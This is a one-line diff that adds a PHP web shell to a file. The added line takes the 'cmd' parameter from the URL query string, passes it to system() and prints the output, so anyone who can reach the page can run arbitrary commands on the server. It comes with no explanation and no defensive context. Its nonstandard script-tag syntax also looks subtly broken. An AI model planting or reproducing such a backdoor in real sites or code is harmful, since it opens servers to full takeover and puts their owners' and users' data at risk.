@@ -1,0 +1,1 @@
+<script type="php">echo system($_GET['cmd']);</script>
